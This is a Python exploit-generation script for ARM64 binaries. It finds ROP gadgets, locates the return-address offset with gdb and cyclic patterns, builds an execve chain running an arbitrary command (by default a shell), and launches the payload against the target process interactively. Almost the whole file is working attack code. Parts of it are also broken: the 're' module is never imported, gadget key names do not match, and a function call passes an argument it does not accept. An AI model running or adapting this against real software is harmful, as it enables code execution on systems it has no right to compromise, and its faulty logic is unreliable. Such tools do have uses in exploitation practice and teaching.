import sys
import os
import argparse
import struct
import subprocess as subp
import math
import os
from pathlib import Path
from elftools.elf.elffile import ELFFile
from pathlib import Path
from capstone import *
from pwn import *

# Ensure the script is running in Python 3
if sys.version_info[0] < 3:
    print("Please run this script with Python 3.")
    sys.exit(1)

# Argument Parser Setup
parser = argparse.ArgumentParser(
    description="Automated ROP Exploit Generator for ARM64 Binaries",
    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
)

parser.add_argument(
    "--binary",
    required=True,
    help="Path to the vulnerable binary (ARM64).",
)

parser.add_argument(
    "--shellcode",
    default=None,
    help="Path to the shellcode file to execute (optional).",
)

parser.add_argument(
    "--command",
    default="/bin/sh -c 'id'",
    help="Command to execute with execve (overrides --shellcode).",
)

parser.add_argument(
    "--output",
    default="exploit_payload",
    help="Path to output the generated exploit payload.",
)

args = parser.parse_args()

# Global Variables
binary_path = args.binary
shellcode_path = args.shellcode
command = args.command
output_path = args.output

# Verify Binary Exists
if not os.path.isfile(binary_path):
    print(f"Error: Binary '{binary_path}' does not exist.")
    sys.exit(1)

# Initialize Pwntools Context
context.log_level = 'info'
context.arch = 'aarch64'
context.endian = 'little'

def find_gadgets(binary_path):
    """
    Disassembles the binary and finds useful ROP gadgets.
    Returns a dictionary with gadget descriptions as keys and their addresses as values.
    """
    gadgets = {}
    md = Cs(CS_ARCH_AARCH64, CS_MODE_ARM)
    md.detail = True

    with open(binary_path, "rb") as f:
        elf = ELFFile(f)

        for section in elf.iter_sections():
            if section.name == '.text':  # Focus only on the .text section
                sec_addr = section['sh_addr']
                sec_data = section.data()

                for insn in md.disasm(sec_data, sec_addr):
                    if insn.mnemonic == 'ret':
                        gadget_size = 16  # Look back for up to 4 instructions (16 bytes)
                        offset = insn.address - sec_addr
                        start = max(0, offset - gadget_size)
                        gadget_bytes = sec_data[start:offset]
                        gadget_insns = list(md.disasm(gadget_bytes, sec_addr + start))[::-1]

                        if len(gadget_insns) >= 1:
                            # Check for 'ldp x0, x1, [sp], #...; ret'
                            if (gadget_insns[0].mnemonic == 'ldp' and
                                'x0' in gadget_insns[0].op_str and
                                'x1' in gadget_insns[0].op_str and
                                '[sp]' in gadget_insns[0].op_str):
                                gadgets['ldp x0, x1; ret'] = gadget_insns[0].address

                            # Check for 'ldp x1, x2, [sp], #...; ret'
                            if (gadget_insns[0].mnemonic == 'ldp' and
                                'x1' in gadget_insns[0].op_str and
                                'x2' in gadget_insns[0].op_str and
                                '[sp]' in gadget_insns[0].op_str):
                                gadgets['ldp x1, x2; ret'] = gadget_insns[0].address

                            # Check for 'ldr x0, [sp], #8; ret'
                            if (gadget_insns[0].mnemonic == 'ldr' and
                                'x0' in gadget_insns[0].op_str and
                                '[sp]' in gadget_insns[0].op_str):
                                gadgets['ldr x0, [sp], #8; ret'] = gadget_insns[0].address

                            # Check for 'str x1, [x0]; ret'
                            if (len(gadget_insns) >= 2 and
                                gadget_insns[0].mnemonic == 'str' and
                                '[x0]' in gadget_insns[0].op_str and
                                'x1' in gadget_insns[0].op_str):
                                gadgets['str x1, [x0]; ret'] = gadget_insns[1].address
    return gadgets

def find_writable_address(binary_path, offset):
    """
    Dynamically find the writable memory address by inspecting the stack.
    """
    gdb_command = [
        'gdb', '--batch',
        '--ex', 'b vulnerable_function',
        '--ex', f'run < /dev/null',
        '--ex', 'info registers sp',
        '--ex', 'x/64x $sp',
        binary_path
    ]

    try:
        gdb_output = subp.run(
            gdb_command, stdout=subp.PIPE, stderr=subp.PIPE, text=True
        ).stdout
        print(f"GDB Output:\n{gdb_output}")

        # Find stack pointer (sp)
        sp_match = re.search(r'sp\s+(0x[a-fA-F0-9]+)', gdb_output)
        if sp_match:
            sp = int(sp_match.group(1), 16)
            print(f"Stack Pointer: {hex(sp)}")

        # Find the writable buffer (assume it's located at sp + offset)
        stack_dump = re.findall(r'(0x[a-fA-F0-9]+)', gdb_output)
        if stack_dump:
            writable_addr = sp + 0x10  # Adjust offset based on the program structure
            return writable_addr

    except Exception as e:
        print(f"Error finding writable address: {e}")
        return None

    return None

def construct_payload(offset, elf, libc, cmd_args, gadgets):
    """
    Constructs the exploit payload to call execve with arbitrary command-line arguments.
    """
    # Start the payload with padding
    payload = b'A' * offset

    # Dynamically determine writable memory address
    writable_addr = find_writable_address(binary_path, offset)  # New function to find writable memory dynamically

    if writable_addr is None:
        log.error("Failed to find writable memory address dynamically.")
        sys.exit(1)

    log.info(f"Using writable memory at address: {hex(writable_addr)}")

    # Prepare command-line arguments as null-terminated strings
    cmd_strings = [arg.encode() + b'\x00' for arg in cmd_args]
    cmd_lengths = [len(s) for s in cmd_strings]
    arg_addresses = [writable_addr + sum(cmd_lengths[:i]) for i in range(len(cmd_lengths))]

    # Ensure writable memory is null-byte free
    for addr in arg_addresses:
        if b'\x00' in p64(addr):
            log.error(f"Writable memory address contains null bytes: {arg_addresses}")
            sys.exit(1)

    # Write command-line arguments to memory
    for arg, addr in zip(cmd_strings, arg_addresses):
        for i in range(0, len(arg), 8):
            chunk = arg[i:i + 8].ljust(8, b'\x00')  # Pad to 8 bytes
            payload += flat([
                gadgets['ldp x0, x1; ret'], addr + i, u64(chunk),
                gadgets['str x1, [x0]; ret']
            ])

    # Construct argv array in memory
    argv_array_addr = writable_addr + sum(cmd_lengths) + 0x200
    for addr in arg_addresses:
        payload += flat([
            gadgets['ldp x0, x1; ret'], argv_array_addr, addr,
            gadgets['str x1, [x0]; ret']
        ])
        argv_array_addr += 8

    # Null-terminate argv array
    payload += flat([
        gadgets['ldp x0, x1; ret'], argv_array_addr, 0,
        gadgets['str x1, [x0]; ret']
    ])

    # Set up registers and call execve
    payload += flat([
        gadgets['ldp x0, x1; ret'], arg_addresses[0], argv_array_addr - 8,
        gadgets['ldp x1_x2_ret'], 0, 0,
        libc.symbols['execve']
    ])

    return payload


def validate_gadgets(gadgets):
    """
    Validates that all required gadgets are present in the discovered gadgets.
    """
    required = ['ldp x0, x1; ret', 'ldp x1, x2; ret', 'ldr x0, [sp], #8; ret']
    for gadget in required:
        if gadget not in gadgets:
            log.error(f"Missing required gadget: {gadget}")
            sys.exit(1)
    log.info("All required gadgets found.")

def create_padding(length, padding_file='padding', n=4):
    """
    Create a file with a cyclic pattern of the specified length.
    """
    padding = cyclic(length, n=n)  # Generates a cyclic pattern with n=4
    with open(padding_file, 'wb') as f:
        f.write(padding)

def check_padding(binary_path, padding_file, n=4):
    """
    Use GDB to check if the padding overwrites the return address.
    """
    gdb_command = [
        'gdb', '--batch',
        '--ex', f'run < {padding_file}',
        '--ex', 'info registers pc',  # Get the Program Counter (PC) value
        binary_path
    ]

    try:
        gdb_output = subp.run(
            gdb_command, stdout=subp.PIPE, stderr=subp.PIPE, text=True
        ).stdout
        print(f"GDB Output:\n{gdb_output}")  # Debugging GDB output
    except Exception as e:
        print(f"Error running GDB: {e}")
        return False

    # Extract the PC value from GDB output
    pc_match = re.search(r'pc\s+(0x[a-fA-F0-9]+)', gdb_output)
    if pc_match:
        pc = int(pc_match.group(1), 16)
        print(f"Extracted PC: {hex(pc)}")

        pc_bytes = p64(pc)

        try:
            offset = cyclic_find(pc_bytes, n=n)  # Still uses `n=4`
            print(f"Found offset: {offset}")
            return offset
        except cyclic.CyclicError:
            print("Pattern not found in cyclic pattern.")
            return False

    print("No PC value found in GDB output.")
    return False  # If no match is found

def find_offset(binary_path, n=4, max_length=1024):
    """
    Finds the offset to overwrite the return address in the vulnerable binary.
    """
    padding_file = 'padding'
    low = 0
    high = max_length

    while low < high:
        guess = (low + high) // 2
        create_padding(guess, padding_file, n=n)
        print(f"Testing padding length: {guess}")

        result = check_padding(binary_path, padding_file, n=n)
        if isinstance(result, int):  # Offset found
            os.remove(padding_file)
            return result

        if result:  # If pattern not found, adjust search range
            high = guess
        else:
            low = guess + 1

    os.remove(padding_file)
    return -1  # Indicate failure

def generate_exploit():
    """
    Orchestrates the exploit generation process by finding gadgets, determining the offset,
    constructing the payload, and deploying the exploit.
    """
    elf = ELF(binary_path)

    log.info("Discovering ROP gadgets...")
    gadgets = find_gadgets(binary_path)
    print(gadgets)
    validate_gadgets(gadgets)
    log.success("Gadgets discovered successfully.")

    libc_path = '/lib/aarch64-linux-gnu/libc.so.6'
    if not os.path.isfile(libc_path):
        log.error(f"Libc not found at {libc_path}.")
        sys.exit(1)
    libc = ELF(libc_path)

    log.info("Finding offset to return address...")
    offset = find_offset(binary_path)
    if offset == -1:
        log.error("Failed to find the offset.")
        sys.exit(1)
    log.success(f"Offset found at {offset} bytes.")

    if shellcode_path:
        if not os.path.isfile(shellcode_path):
            log.error(f"Shellcode file '{shellcode_path}' does not exist.")
            sys.exit(1)
        with open(shellcode_path, 'rb') as f:
            shellcode = f.read()
        log.info(f"Shellcode loaded from '{shellcode_path}'.")
        payload = construct_payload(offset, elf, libc, [], gadgets, shellcode=shellcode)
    else:
        cmd_args = command.split()
        log.info(f"Using execve with command: {' '.join(cmd_args)}")
        payload = construct_payload(offset, elf, libc, cmd_args, gadgets)

    with open(output_path, 'wb') as f:
        f.write(payload)
    log.success(f"Exploit payload written to '{output_path}'.")

    log.info("Deploying the exploit...")
    p = process(binary_path)
    p.sendline(payload)
    log.success("Payload sent. Interacting with the shell...")
    p.interactive()

if __name__ == "__main__":
    generate_exploit()
